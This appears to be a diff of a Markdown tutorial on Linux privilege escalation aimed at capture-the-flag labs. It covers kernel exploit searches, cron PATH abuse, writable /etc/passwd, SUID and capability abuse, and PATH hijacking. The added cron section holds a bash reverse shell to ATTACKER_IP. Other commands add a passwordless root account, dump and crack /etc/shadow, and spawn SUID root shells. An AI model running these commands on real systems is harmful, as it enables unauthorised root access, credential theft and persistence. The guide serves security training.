@@ -6,10 +6,23 @@
 Step 1: Identify & Search for Exploits
 The first step is to identify potential exploits for the target system. You can use Searchsploit to find known vulnerabilities for the specific kernel version.
     
+    cat /proc/version
     uname -a #will print the Kernel Version
     searchsploit linux 3.13.0-24
 This will list exploits relevant to the kernel version. In this case, the target kernel version is 3.13.0-24.
+
+To extract all the vulnerable kernel versions from that web you can do:
+
+    curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ![image](https://github.com/user-attachments/assets/5629083f-a755-4c84-be78-db0c17a3e6fe)
+
+Tools that could help searching for kernel exploits are:
+
+[suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
+[suggester2](https://github.com/jondonas/linux-exploit-suggester-2)
+[linuxprivchecker](http://www.securitysift.com/download/linuxprivchecker.py)
+
+Always search the kernel version in Google, maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.
 
 Step 2: Locate the Exploit
 Once you’ve identified a suitable exploit, use the locate command to find its full path and inspect the code.
@@ -140,9 +153,16 @@ Here’s how you can potentially overwrite the /etc/passwd file to give yourself
     sudo find / -maxdepth 0 -fprintf "$LFILE" "$DATA"
 Explanation:
 
-This command creates a new user called siren in the /etc/passwd file with root privileges by adding a new line.
+This command creates a new user called siren in the /etc/passwd file with root privileges by adding a new line. could allow you to access the system as the siren user with root access. However, remember that overwriting critical system files can be dangerous.
 
-This could allow you to access the system as the siren user with root access. However, remember that overwriting critical system files can be dangerous.
+Sudo version
+Based on the vulnerable sudo versions that appear in:
+
+    searchsploit sudo
+You can check if the sudo version is vulnerable using this grep.
+
+    sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+
 ---
 Abusing Intended Functionality
 ------------------------------
@@ -169,6 +189,16 @@ Finding the Flag: Once you have root access, locate the flag and/or crack passwo
 
 Path
 ----
+Cron jobs are scheduled tasks that run scripts or binaries at specified times. By default, they execute with the privileges of their owner, not the user who triggers them. If a cron job is owned by root but writable by an unprivileged user, that user can inject code to run as root.
+
+1. Understand Where Cron Jobs Live
+System-wide crontab:
+/etc/crontab — defines global scheduled tasks.
+
+Per-user crontabs:
+/var/spool/cron/crontabs/<username> — only editable by the respective user.
+
+Cron directories (/etc/cron.hourly, /etc/cron.daily, etc.)
 
 If PATH variable defined inside a crontab, and one of the paths is writable, and the cron job doesn't refer to an absolute path, we can exploit.
 
@@ -177,27 +207,47 @@ If PATH variable defined inside a crontab, and one of the paths is writable, and
     SHELL=/bin/sh
     PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-    * * * * * root overwrite.sh
-
-In the example above, /home/user is in the PATH and our user can write to it.
-
-Create a /home/user/overwrite.sh script which makes a SUID/SGID bit version of bash:
+    * * * * * root backup.sh
+   ![image](https://github.com/user-attachments/assets/d30b6e0d-abcc-46ad-9898-cdc241acff03)
 
 
-    #!/bin/bash
-    cp /bin/bash /tmp/rootbash
-    chmod +s /tmp/rootbash
+In the example above, /home/karen is in the PATH and our user can write to it.
 
-Make the script executable:
+Confirm What’s Running and When
+You can observe cron in action using a tool like pspy on the target:
+
+# Transfer and run pspy to monitor cron executions
+
+    ./pspy64
+You’ll see lines like:
+
+[CRON] running /usr/local/bin/backup.sh
+
+Inject Your Payload:
+
+Create a /home/karen/backup.sh script which makes a SUID/SGID bit version of bash:
+Since you have write access, append a reverse-shell or any root-shell payload:
+
+Edit the script:
+
+    nano /usr/local/bin/backup.sh
+Append, for example, a simple bash reverse shell:
+
+    # …existing backup commands…
+    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+Save and exit.
+Check and make the script executable:
+
+    $ chmod +x /home/karen/backup.sh
+
+Now wait for the cron job to execute. When it does,Start a listener on your attacker machine:
 
 
-    $ chmod +x /home/user/overwrite.sh
-
-Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:
-
-
-    $ /tmp/rootbash -p
+    $ nc -lvnp 4444
     #
+Wait up to one minute for cron to run the modified script.
+
+You’ll receive a root shell connection.
 
 Wildcards
 ---------
@@ -271,70 +321,121 @@ Now wait for the cron job to execute. When it does, execute the /tmp/rootbash bi
 
     $ /tmp/rootbash -p
     #
+</details>
 
-File Permissions
-================
+<details>
+<summary>File Permissions</summary>
+ <br> 
 
-Writable /etc/passwd
---------------------
+Writable /etc/passwd Privilege Escalation
 
-On some \*nix distributions, if /etc/passwd is writable, we can add a new root user with no password, since the only thing that matters is the uid being 0:
+The /etc/passwd file on Unix-like systems contains essential information about user accounts, including the username, UID, GID, home directory, and default shell. If this file is writable by an unprivileged user, it presents a significant security vulnerability.
 
+1. The passwd File Format
+Each line in /etc/passwd represents a user account in the following format:
 
-    $ echo newroot::0:0:root:/root:/bin/bash >> /etc/passwd
+       username:password:UID:GID:GECOS:home_dir:shell
 
-Now use su to switch user:
+Exploiting a Writable /etc/passwd
+If an attacker can modify /etc/passwd and add an entry for a new user with UID 0 (the root user ID), they can gain root access without needing a password.
 
+Steps to Add a New Root User
+Check if /etc/passwd is writable: Verify if you have write access to /etc/passwd:
 
-    $ su newroot
-    #
+    ls -l /etc/passwd
+If you have write permissions, proceed.
 
+Add a new root user: Use echo to append a new user to /etc/passwd with UID 0 (root user). This will make the new user a root user with no password.
+
+    echo newroot::0:0:root:/root:/bin/bash >> /etc/passwd
+Explanation:
+
+newroot is the username of the new account.
+
+:: indicates no password.
+
+0:0 are the UID and GID for root.
+
+/root is the home directory (root's home).
+
+/bin/bash is the default shell for this new user.
+
+Switch to the new root user: Use su (switch user) to change to the newroot account:
+
+    su newroot
+You now have root privileges: After switching, you will have a root shell:
+
+    # whoami
+      root
+Important Notes
+No Password Needed: Since the new account has no password, the system won't prompt for one, and you can immediately log in as the new root user.
+
+Permanent Access: The new root user will persist across reboots until /etc/passwd is modified again. This makes this method highly effective for establishing persistent root access.
 
 </details>
 
 <details>
 <summary>SUID Binaries</summary>
  <br> 
-Shared Object Injection
+Shared Object Injection: Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.
 ^^^^^^^^^^^^^^^^^^^^^^^
 
 Shared Objects (.so) are the \*nix equivalent of Windows DLLs. If a program references a shared object that we can write to (even if it doesn't exist) we can run commands with the user context of the application.
 
 Find SUID/SGID binaries:
 
-
     $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
-    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-    -rwsr-sr-x 1 root root 16664 Feb  9 13:43 /tmp/rootsh
-    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+    or
+    find / -type f -perm -04000 -ls 2>/dev/null
+    or
+    find / -perm -u=s -type f 2>/dev/null
+    
+These commands search the system for files with the SUID (04000) or SGID (02000) bits set and list them. Files with these special permission bits could potentially allow privilege escalation.
+
+ ![image](https://github.com/user-attachments/assets/8886aea9-5c2f-47cf-adb5-361f174fde67)
+
+A good practice would be to compare executables on this list with GTFOBins. Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a [pre-filtered list](https://gtfobins.github.io/#+suid).
+
+Base64 configured with the SUID bit, can be leveraged for privilege escalation.
+Decoding Base64-Encoded Files
+You can sometimes encounter base64-encoded files like /etc/shadow or /etc/passwd, which contain encrypted or sensitive data. To decode these files, use the following commands:
+
+Example for /etc/shadow:
+
+    LFILE=/etc/shadow
+    base64 "$LFILE" | base64 --decode
+This will decode the base64-encoded contents of /etc/shadow.
+![image](https://github.com/user-attachments/assets/a520482d-fa30-4ac5-876e-17b2c3c13bc7)
+
+Example for /etc/passwd:
+
+    LFILE=/etc/passwd
+    base64 "$LFILE" | base64 --decode
+This will decode the base64-encoded contents of /etc/passwd.
+
+Cracking Password Hashes
+After you have decoded sensitive files like /etc/shadow or /etc/passwd, you can extract password hashes and attempt to crack them.
+
+Cracking /etc/shadow and /etc/passwd
+Decode both files and copy them to your system. Then, run the following commands to prepare for password cracking:
+
+    unshadow user2pass user2 > passwd.txt  # user2pass = /etc/passwd, user2 = /etc/shadow
+
+Use John the Ripper to crack the password hashes with a wordlist:
+
+    sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
+This will attempt to crack the password hashes using the rockyou.txt wordlist.
+![image](https://github.com/user-attachments/assets/fcef5969-8533-4831-818a-946f88f12ed3)
+
+Directly flag can be achived using base64 ablites: 
+Example for a specific file (e.g., flag3.txt):
+
+      LFILE=home/ubuntu/flag3.txt
+      base64 "$LFILE" | base64 --decode
+This command decodes the contents of flag3.txt.
+![image](https://github.com/user-attachments/assets/cc23f201-dde6-4043-9ac5-9580c5648988)
 
 Use strace to find references to shared objects:
-
 
     $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
     access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
@@ -551,9 +652,123 @@ We can get an instance root shell:
 
 
     env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod +s /tmp/rootbash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/rootbash -p'
+</details>
+<details>
+<summary>Capabilities</summary>
+ <br> 
+ What Are Capabilities?
+In Unix-like systems, capabilities are used to provide more granular control over the privileges of processes or binaries, rather than granting full root access. This method allows administrators to assign specific privileges to processes that would typically require higher-level permissions.
 
-Startup Scripts
----------------
+For example:
+
+A SOC analyst might need to run a tool that initiates socket connections, but they don't require full root access. By using capabilities, the administrator can grant just the necessary permission to that specific tool, rather than giving the analyst root privileges.
+
+How Capabilities Work
+Instead of giving a program full root privileges, a system administrator can set specific capabilities on a binary to allow it to perform certain actions that would otherwise require elevated privileges. For instance, a binary might be given the capability to bind to privileged ports or set user IDs without granting the user full root access.
+
+You can check which capabilities are assigned to a binary or process using the getcap tool.
+
+Checking Capabilities on a System
+To list all the binaries with specific capabilities set on your system, use the following command:
+
+getcap -r / 2>/dev/null
+This command recursively checks all files starting from the root directory and lists those with capabilities set. The output might look something like this:
+
+/usr/bin/vim = cap_setuid+ep
+This means that the vim binary has the cap_setuid capability, which allows it to change its user ID (UID) to any value, including root (UID 0).
+
+Example of Exploiting Capabilities for Privilege Escalation
+Let's say the vim binary has been granted the cap_setuid capability. This capability allows vim to change the user ID of the current process. If we can use this capability to set the user ID to 0 (root), we can effectively escalate our privileges.
+
+Check the Capabilities: We use the getcap tool to see that vim has the cap_setuid capability set.
+
+getcap /usr/bin/vim
+Output might be:
+
+/usr/bin/vim = cap_setuid+ep
+Escalate to Root Using vim: With the cap_setuid capability, we can craft a command that uses vim to escalate to root. The following command utilizes Python scripting inside vim to change the user ID to 0 (root) and then spawn a root shell:
+
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+Breakdown of the Command:
+:py3 import os: This imports the Python os module within vim.
+
+os.setuid(0): This changes the user ID of the current process to 0, which is the root user.
+
+os.execl("/bin/sh", "sh", "-c", "reset; exec sh"): This replaces the current process (which is vim) with a new shell (/bin/sh), and it spawns a root shell.
+
+Result:
+This command will execute the Python code inside vim, which changes the user ID to 0 (root) and opens a shell with root privileges. The result is a root shell.
+
+After executing this, running whoami will show:
+
+# whoami
+root
+You now have root access without needing to log in as the root user.
+
+Conclusion
+Capabilities offer a more granular control over process privileges by allowing specific permissions, such as changing user IDs or binding to privileged ports, to be granted to a binary.
+
+If a binary like vim is configured with the cap_setuid capability, it can change its UID to root and escalate privileges.
+
+Always ensure to audit and manage capabilities carefully to avoid inadvertent privilege escalation opportunities.
+
+This method highlights the importance of reviewing and controlling which capabilities are granted to binaries on your system.
+</details>
+<details>
+<summary>PATH Hijacking</summary>
+ <br> 
+ What is the PATH Environment Variable?
+In Linux, PATH is an environmental variable that tells the operating system where to look for executable files. When you run a command in the shell (such as ls, cat, or any custom script), Linux searches for that command in the directories listed in the PATH variable.
+
+For example:
+
+If a command is not built into the shell or if its absolute path is not specified, Linux will start searching for it in the directories defined under the PATH variable.
+
+The PATH variable typically contains directories like /usr/bin, /bin, /usr/local/bin, etc., where most of the system binaries are stored.
+
+How to Check the PATH?
+You can check the current directories in your PATH by running:
+
+echo $PATH
+This will show a colon-separated list of directories, like this:
+
+/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/games:/usr/games:/snap/bin
+Exploiting Writable Folders in PATH
+If a folder listed in PATH has write permissions for your user, you could potentially hijack an application by placing a malicious script or executable in that folder. This could trick the system into running your script instead of the legitimate binary when the application is called.
+
+Writable Folders Search: To identify writable directories in the PATH, you can use the following command:
+
+find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
+This will search for writable folders under the /usr directory and display the results. Some of these directories may be part of the PATH and could be hijacked.
+
+Example output might look like this:
+
+/usr/local
+/usr/bin
+Hijacking a Command: If a writable folder is found in PATH, you can replace a system command with a malicious script. For example, you could create a script named thm in a writable directory like /tmp and hijack the thm command.
+
+Example of Hijacking Using Writable Folders in PATH
+Let’s consider the following example:
+
+Check the Current PATH: We can check if /tmp is in the PATH by running:
+
+echo $PATH
+If /tmp is not in the PATH, we can add it. This is done using the following command:
+
+export PATH=/tmp:$PATH
+This command prepends /tmp to the beginning of the PATH, making it the first directory that the system will search for executables.
+
+Creating a Malicious Script: Next, we can create a malicious executable in /tmp. In this case, we can copy the /bin/bash binary to /tmp and rename it to thm:
+
+cp /bin/bash /tmp/thm
+chmod +x /tmp/thm
+Hijacking the Application: Now, if the system tries to run the thm command, it will search in /tmp first (because we added it to the PATH). Since we have placed our malicious thm script in /tmp, the system will execute our script instead of the legitimate one.
+
+When the user runs the thm command, the system will execute the bash shell from /tmp, giving the attacker a shell with the same privileges as the user who ran the command.
+</details>
+<details>
+<summary>Startup Scripts</summary>
+ <br> 
 
 Startup scripts are stored under /etc/init.d, and are usually run with elevated privileges.
 
@@ -575,9 +790,10 @@ Now restart the remote host, and once the host is restarted, spawn a root shell:
 
     $ /tmp/rootbash -p
     #
-
-Configuration Files
--------------------
+</details>
+<details>
+<summary>Configuration Files</summary>
+ <br> 
 
 Configuration files are usually stored in /etc.
 
